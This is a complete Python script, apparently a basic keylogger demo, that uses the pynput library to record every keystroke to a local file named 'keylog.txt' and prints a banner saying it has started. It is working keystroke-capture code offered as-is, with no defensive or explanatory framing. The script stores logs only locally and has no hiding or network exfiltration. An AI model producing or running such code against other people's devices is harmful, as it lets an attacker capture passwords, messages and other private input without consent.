from pynput import keyboard

# The file where the keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        # For normal alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys (Space, Enter, Shift, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def main():
    print("--- ⌨️ Basic Keylogger Started ---")
    print("[*] Recording keystrokes to 'keylog.txt'.")
    print("[*] To stop, click on your terminal and press Ctrl+C.")
    
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()